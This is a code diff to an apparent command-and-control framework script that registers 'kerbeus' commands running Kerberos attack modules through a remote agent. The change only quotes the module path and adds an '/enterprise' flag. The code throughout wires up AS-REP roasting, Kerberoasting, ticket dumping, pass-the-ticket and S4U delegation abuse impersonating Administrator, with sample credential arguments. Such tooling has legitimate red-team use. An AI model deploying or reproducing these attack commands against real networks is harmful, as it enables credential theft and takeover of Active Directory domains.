@@ -7,7 +7,7 @@ _cmd_asreproasting.setPreHook(function (id, cmdline, parsed_json, ...parsed_line
     let bof_params = ax.bof_pack("cstr", [params]);
     let bof_path = ax.script_dir() + "_bin/Kerbeus-BOF/asreproasting." + ax.arch(id) + ".o";
 
-    ax.execute_alias(id, cmdline, `execute bof ${bof_path} ${bof_params}`, "Task: Kerbeus ASREPROASTING");
+    ax.execute_alias(id, cmdline, `execute bof "${bof_path}" ${bof_params}`, "Task: Kerbeus ASREPROASTING");
 });
 
 let _cmd_asktgt = ax.create_command("asktgt", "Retrieve a TGT", "kerbeus asktgt /user:Admin /password:QWErty /enctype:aes256 /opsec /ptt");
@@ -18,18 +18,18 @@ _cmd_asktgt.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines)  {
     let bof_params = ax.bof_pack("cstr", [params]);
     let bof_path = ax.script_dir() + "_bin/Kerbeus-BOF/asktgt." + ax.arch(id) + ".o";
 
-    ax.execute_alias(id, cmdline, `execute bof ${bof_path} ${bof_params}`, "Task: Kerbeus ASKTGT");
+    ax.execute_alias(id, cmdline, `execute bof "${bof_path}" ${bof_params}`, "Task: Kerbeus ASKTGT");
 });
 
 let _cmd_asktgs = ax.create_command("asktgs", "Retrieve a TGS", "kerbeus asktgs /service:CIFS/dc.domain.local /ticket:doIF8DCCBey... /opsec");
-_cmd_asktgs.addArgString("params", true, "Args: /ticket:BASE64 /service:SPN1,SPN2,... [/domain:DOMAIN] [/dc:DC] [/tgs:BASE64] [/targetdomain:DOMAIN] [/targetuser:USER] [/enctype:(rc4|aes256)] [/ptt] [/keylist] [/u2u] [/opsec] [/dmsa]");
+_cmd_asktgs.addArgString("params", true, "Args: /ticket:BASE64 /service:SPN1,SPN2,... [/domain:DOMAIN] [/dc:DC] [/tgs:BASE64] [/targetdomain:DOMAIN] [/targetuser:USER] [/enctype:(rc4|aes256)] [/ptt] [/keylist] [/u2u] [/opsec] [/enterprise] [/dmsa]");
 _cmd_asktgs.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines)  {
     let params = parsed_json["params"];
 
     let bof_params = ax.bof_pack("cstr", [params]);
     let bof_path = ax.script_dir() + "_bin/Kerbeus-BOF/asktgs." + ax.arch(id) + ".o";
 
-    ax.execute_alias(id, cmdline, `execute bof ${bof_path} ${bof_params}`, "Task: Kerbeus ASKTGS");
+    ax.execute_alias(id, cmdline, `execute bof "${bof_path}" ${bof_params}`, "Task: Kerbeus ASKTGS");
 });
 
 let _cmd_changepw = ax.create_command("changepw", "Reset a user's password from a supplied TGT", "kerbeus changepw /new:New_P4ss /ticket:doIF8DCCBey...");
@@ -40,7 +40,7 @@ _cmd_changepw.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines)  {
     let bof_params = ax.bof_pack("cstr", [params]);
     let bof_path = ax.script_dir() + "_bin/Kerbeus-BOF/changepw." + ax.arch(id) + ".o";
 
-    ax.execute_alias(id, cmdline, `execute bof ${bof_path} ${bof_params}`, "Task: Kerbeus CHANGEPW");
+    ax.execute_alias(id, cmdline, `execute bof "${bof_path}" ${bof_params}`, "Task: Kerbeus CHANGEPW");
 });
 
 let _cmd_describe = ax.create_command("describe", "Parse and describe a ticket", "kerbeus describe /ticket:doIF8DCCBey...");
@@ -51,7 +51,7 @@ _cmd_describe.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines)  {
     let bof_params = ax.bof_pack("cstr", [params]);
     let bof_path = ax.script_dir() + "_bin/Kerbeus-BOF/describe." + ax.arch(id) + ".o";
 
-    ax.execute_alias(id, cmdline, `execute bof ${bof_path} ${bof_params}`, "Task: Kerbeus DESCRIBE");
+    ax.execute_alias(id, cmdline, `execute bof "${bof_path}" ${bof_params}`, "Task: Kerbeus DESCRIBE");
 });
 
 let _cmd_dump = ax.create_command("dump", "Dump tickets", "kerbeus dump");
@@ -62,7 +62,7 @@ _cmd_dump.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines)  {
     let bof_params = ax.bof_pack("cstr", [params]);
     let bof_path = ax.script_dir() + "_bin/Kerbeus-BOF/dump." + ax.arch(id) + ".o";
 
-    ax.execute_alias(id, cmdline, `execute bof ${bof_path} ${bof_params}`, "Task: Kerbeus DUMP");
+    ax.execute_alias(id, cmdline, `execute bof "${bof_path}" ${bof_params}`, "Task: Kerbeus DUMP");
 });
 
 let _cmd_hash = ax.create_command("hash", "Calculate rc4_hmac, aes128_cts_hmac_sha1, aes256_cts_hmac_sha1 hashes", "kerbeus hash /password:!Q@W3e4r");
@@ -73,7 +73,7 @@ _cmd_hash.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines)  {
     let bof_params = ax.bof_pack("cstr", [params]);
     let bof_path = ax.script_dir() + "_bin/Kerbeus-BOF/hash." + ax.arch(id) + ".o";
 
-    ax.execute_alias(id, cmdline, `execute bof ${bof_path} ${bof_params}`, "Task: Kerbeus HASH");
+    ax.execute_alias(id, cmdline, `execute bof "${bof_path}" ${bof_params}`, "Task: Kerbeus HASH");
 });
 
 let _cmd_kerberoasting = ax.create_command("kerberoasting", "Perform Kerberoasting", "kerbeus kerberoasting /spn:CIFS/COMP.domain.local /ticket:doIF8DCCBey...");
@@ -84,7 +84,7 @@ _cmd_kerberoasting.setPreHook(function (id, cmdline, parsed_json, ...parsed_line
     let bof_params = ax.bof_pack("cstr", [params]);
     let bof_path = ax.script_dir() + "_bin/Kerbeus-BOF/kerberoasting." + ax.arch(id) + ".o";
 
-    ax.execute_alias(id, cmdline, `execute bof ${bof_path} ${bof_params}`, "Task: Kerbeus KERBEROASTING");
+    ax.execute_alias(id, cmdline, `execute bof "${bof_path}" ${bof_params}`, "Task: Kerbeus KERBEROASTING");
 });
 
 let _cmd_klist = ax.create_command("klist", "List tickets", "kerbeus klist /luid:3ea8");
@@ -95,7 +95,7 @@ _cmd_klist.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines)  {
     let bof_params = ax.bof_pack("cstr", [params]);
     let bof_path = ax.script_dir() + "_bin/Kerbeus-BOF/klist." + ax.arch(id) + ".o";
 
-    ax.execute_alias(id, cmdline, `execute bof ${bof_path} ${bof_params}`, "Task: Kerbeus KLIST");
+    ax.execute_alias(id, cmdline, `execute bof "${bof_path}" ${bof_params}`, "Task: Kerbeus KLIST");
 });
 
 let _cmd_ptt = ax.create_command("ptt", "Submit a TGT", "kerbeus ptt /ticket:doIF8DCCBey...");
@@ -106,7 +106,7 @@ _cmd_ptt.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines)  {
     let bof_params = ax.bof_pack("cstr", [params]);
     let bof_path = ax.script_dir() + "_bin/Kerbeus-BOF/ptt." + ax.arch(id) + ".o";
 
-    ax.execute_alias(id, cmdline, `execute bof ${bof_path} ${bof_params}`, "Task: Kerbeus PTT");
+    ax.execute_alias(id, cmdline, `execute bof "${bof_path}" ${bof_params}`, "Task: Kerbeus PTT");
 });
 
 let _cmd_purge = ax.create_command("purge", "Purge tickets", "kerbeus purge /luid:3ea8");
@@ -117,7 +117,7 @@ _cmd_purge.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines)  {
     let bof_params = ax.bof_pack("cstr", [params]);
     let bof_path = ax.script_dir() + "_bin/Kerbeus-BOF/purge." + ax.arch(id) + ".o";
 
-    ax.execute_alias(id, cmdline, `execute bof ${bof_path} ${bof_params}`, "Task: Kerbeus PURGE");
+    ax.execute_alias(id, cmdline, `execute bof "${bof_path}" ${bof_params}`, "Task: Kerbeus PURGE");
 });
 
 let _cmd_renew = ax.create_command("renew", "Renew a TGT", "kerbeus renew /ticket:doIF8DCCBey...");
@@ -128,7 +128,7 @@ _cmd_renew.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines)  {
     let bof_params = ax.bof_pack("cstr", [params]);
     let bof_path = ax.script_dir() + "_bin/Kerbeus-BOF/renew." + ax.arch(id) + ".o";
 
-    ax.execute_alias(id, cmdline, `execute bof ${bof_path} ${bof_params}`, "Task: Kerbeus RENEW");
+    ax.execute_alias(id, cmdline, `execute bof "${bof_path}" ${bof_params}`, "Task: Kerbeus RENEW");
 });
 
 let _cmd_s4u = ax.create_command("s4u", "Perform S4U constrained delegation abuse", "kerbeus s4u /ticket:doIF8DCCBey... /impersonateuser:Administrator /service:host/comp.domain.local /altservice:http,cifs");
@@ -139,7 +139,7 @@ _cmd_s4u.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines)  {
     let bof_params = ax.bof_pack("cstr", [params]);
     let bof_path = ax.script_dir() + "_bin/Kerbeus-BOF/s4u." + ax.arch(id) + ".o";
 
-    ax.execute_alias(id, cmdline, `execute bof ${bof_path} ${bof_params}`, "Task: Kerbeus S4U");
+    ax.execute_alias(id, cmdline, `execute bof "${bof_path}" ${bof_params}`, "Task: Kerbeus S4U");
 });
 
 let _cmd_cross_s4u = ax.create_command("cross_s4u", "Perform S4U constrained delegation abuse across domains", "kerbeus cross_s4u /ticket:doIF8DCCBey... /impersonateuser:Administrator /targetdomain:sdomain.local /targetdc:dc.sdomain.local /service:host/comp.sdomain.local /altservice:http,cifs");
@@ -150,7 +150,7 @@ _cmd_cross_s4u.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines)  
     let bof_params = ax.bof_pack("cstr", [params]);
     let bof_path = ax.script_dir() + "_bin/Kerbeus-BOF/cross_s4u." + ax.arch(id) + ".o";
 
-    ax.execute_alias(id, cmdline, `execute bof ${bof_path} ${bof_params}`, "Task: Kerbeus CROSS_S4U");
+    ax.execute_alias(id, cmdline, `execute bof "${bof_path}" ${bof_params}`, "Task: Kerbeus CROSS_S4U");
 });
 
 let _cmd_tgtdeleg = ax.create_command("tgtdeleg", "Retrieve a usable TGT for the current user without elevation by abusing the Kerberos GSS-API", "kerbeus tgtdeleg");
@@ -161,7 +161,7 @@ _cmd_tgtdeleg.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines)  {
     let bof_params = ax.bof_pack("cstr", [params]);
     let bof_path = ax.script_dir() + "_bin/Kerbeus-BOF/tgtdeleg." + ax.arch(id) + ".o";
 
-    ax.execute_alias(id, cmdline, `execute bof ${bof_path} ${bof_params}`, "Task: Kerbeus TGTDELEG");
+    ax.execute_alias(id, cmdline, `execute bof "${bof_path}" ${bof_params}`, "Task: Kerbeus TGTDELEG");
 });
 
 let _cmd_triage = ax.create_command("triage", "List tickets in table format", "kerbeus triage /luid:3ea8");
@@ -172,7 +172,7 @@ _cmd_triage.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines)  {
     let bof_params = ax.bof_pack("cstr", [params]);
     let bof_path = ax.script_dir() + "_bin/Kerbeus-BOF/triage." + ax.arch(id) + ".o";
 
-    ax.execute_alias(id, cmdline, `execute bof ${bof_path} ${bof_params}`, "Task: Kerbeus TRIAGE");
+    ax.execute_alias(id, cmdline, `execute bof "${bof_path}" ${bof_params}`, "Task: Kerbeus TRIAGE");
 });
 
 var cmd_kerbeus = ax.create_command("kerbeus", "Kerberos abuse (kerbeus BOF)");
